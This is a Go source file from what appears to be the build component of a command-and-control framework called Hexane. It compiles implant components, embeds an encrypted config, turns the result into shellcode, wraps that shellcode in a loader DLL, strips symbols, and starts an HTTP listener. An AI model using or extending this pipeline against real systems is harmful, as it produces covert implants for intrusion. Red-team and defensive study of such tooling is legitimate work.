package core

import (
	"fmt"
	"os"
	"os/exec"
	"path"
	"strconv"
	"time"
)

var (
	LinkerLoader 	= LoaderPath + "/linker.loader.ld"
	LinkerImplant 	= ImplantPath + "/linker.implant.ld"
	HashStrings 	= ConfigsPath + "/strings.txt"
	DllMain   		= LoaderPath + "dllmain.cpp"
	RsrcScript  	= LoaderPath + "/resource.rc"
)

func (h *HexaneConfig) RunBuild() error {
	var err error

	if err = h.BuildUpdate(); err != nil {
		return err
	}

	go h.HttpServerHandler()
	time.Sleep(time.Millisecond * 500)

	return nil
}

func (h *HexaneConfig) CreateIncludes(incs []string) string {
	var list string

	for _, inc := range incs {
		list += fmt.Sprintf(" -I%s ", inc)
	}

	return list
}

func (h *HexaneConfig) CreateArguments(args []string) string {
	var (
		list string
	)

	for _, arg := range args {
		list += fmt.Sprintf(" %s ", arg)
	}
	return list
}

func (h *HexaneConfig) CreateDefinitions(defs map[string][]byte) string {
	var list string

	if h.Implant.ProfileTypeId == TRANSPORT_HTTP {
		list += " -DTRANSPORT_HTTP "

	} else if h.Implant.ProfileTypeId == TRANSPORT_PIPE {
		list += " -DTRANSPORT_PIPE "
	}

	if h.Compiler.Debug {
		list += " -DDEBUG "
	}

	for name, def := range defs {
		arr := CreateCppArray(def, len(def))

		if def == nil {
			list += fmt.Sprintf(" -D%s ", name)
		} else {
			list += fmt.Sprintf(" -D%s=%s ", name, arr)
		}
	}
	return list
}

func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []string, output string) error {
	var (
		Command string
		err     error
	)

	Command += command

	if targets != nil {
		Command += h.CreateArguments(targets)
	}

	if includes != nil {
		Command += h.CreateIncludes(includes)
	}

	if flags != nil {
		Command += h.CreateArguments(flags)
	}

	Command += fmt.Sprintf(" -o %s ", output)

	if err = h.RunCommand(Command); err != nil {
		return err
	}
	return nil
}

func (h *HexaneConfig) GenerateConfig() error {
	var (
		Patch []byte
		Xtea  []byte
		err   error
	)

	h.Key = nil
	h.Key = CryptCreateKey(16)

	if Patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	Xtea = Patch

	h.ConfigBytes = Xtea
	return nil
}

func (h *HexaneConfig) GenerateLoader() error {
	var (
		err error
		injectCfg *InjectConfig
	)

	RsrcObj := h.Compiler.BuildDirectory + "/resource.res"
	RsrcData := h.Compiler.BuildDirectory + "/shellcode.bin"
	CoreCpp := h.Compiler.BuildDirectory + "/ldrcore.cpp"
	CoreComponents := h.Compiler.BuildDirectory + "/ldrcore.cpp.o"
	Output := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension


	WrapMessage("DBG", "generating loader config")
	if injectCfg, err = h.GetInjectConfig(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating strings config")
	injectCfg.InjectConfig = h.GetEmbededStrings(injectCfg.Strings)

	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DRSRCDATA=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
		return err
	}

	WrapMessage("DBG", "compiling execute object")
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreCpp, injectCfg.ExecuteObj}, nil, h.Compiler.IncludeDirs, CoreComponents); err != nil {
		return err
	}

	Components := []string{
		DllMain,
		RsrcObj,
		CoreComponents,
	}

	WrapMessage("DBG", "compiling final dll")
	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, Components, []string{"-shared"}, h.Compiler.IncludeDirs, Output); err != nil {
		return err
	}

	WrapMessage("DBG", "embeding strings config into loader dll")
	if err = h.EmbedSectionData(Output, ".text$G", injectCfg.InjectConfig); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		WrapMessage("DBG", "stripping symbols")
		if err = h.RunCommand(h.Compiler.Strip + " " + Output); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) GenerateObjects() error {
	var (
		files []os.DirEntry
		dir   string
		err   error
	)

	var embedStrings = h.GetEmbededStrings(ModuleStrings)

	for _, dir = range h.Compiler.ComponentDirs {
		if files, err = os.ReadDir(dir); err != nil {
			return err
		}

		for _, file := range files {
			if file.Name() == ".idea" {
				continue
			}

			FilePath := RootDirectory + dir + "/" + file.Name()
			ObjFile := RootDirectory + h.Compiler.BuildDirectory + "/" + file.Name() + ".o"

			if path.Ext(file.Name()) == ".cpp" {
				if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{FilePath}, h.Compiler.Flags, []string{RootDirectory}, ObjFile); err != nil {
					return err
				}

				if file.Name() == "core.cpp" {
					WrapMessage("DBG", "embedding core config")
					if err = h.EmbedSectionData(ObjFile, ".text$F", h.ConfigBytes); err != nil {
						return err
					}

					WrapMessage("DBG", "embedding strings config")
					if err = h.EmbedSectionData(ObjFile, ".text$G", embedStrings); err != nil {
						return err
					}
				}

				h.Components = append(h.Components, ObjFile)

			} else if path.Ext(file.Name()) == ".asm" {
				if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{FilePath}, nil, nil, ObjFile); err != nil {
					return err
				}

				h.Components = append(h.Components, ObjFile)
			}
		}
	}

	Intermediate := h.Compiler.BuildDirectory + "/interm.exe"

	WrapMessage("DBG", "linking core components")
	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerImplant, h.Components, nil, h.Compiler.IncludeDirs, Intermediate); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) RunCommand(cmd string) error {
	var (
		Command *exec.Cmd
		Log     *os.File
		LogName string
		err     error
	)

	WrapMessage("DBG", fmt.Sprintf("running command: %s", cmd))
	LogName = LogsPath + strconv.Itoa(int(h.Implant.PeerId)) + "-build-error.log"

	if Log, err = os.Create(LogName); err != nil {
		return err
	}

	defer Log.Close()

	Command = exec.Command("bash", "-c", cmd)
	Command.Stdout = Log
	Command.Stderr = Log

	if err = Command.Run(); err != nil {
		return fmt.Errorf("compilation error. Check %s for details", LogName)
	}

	return nil
}

func (h *HexaneConfig) BuildUpdate() error {
	var (
		err error
	)

	WrapMessage("INF", "starting build...")
	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("INF", "generating config")
	if err = h.GenerateConfig(); err != nil {
		return err
	}

	WrapMessage("INF", "generating hashes")
	if err = GenerateHashes(RootDirectory + HashStrings, RootDirectory + "/src/include/names.hpp"); err != nil {

		return err
	}

	WrapMessage("INF", "generating core components")
	if err = h.GenerateObjects(); err != nil {
		return err
	}

	WrapMessage("INF", "generating shellcode")
	if err = h.CopySectionData(h.Compiler.BuildDirectory + "/interm.exe", h.Compiler.BuildDirectory + "/shellcode.bin", ".text"); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		WrapMessage("INF", "generating dll loader")
		if err = h.GenerateLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
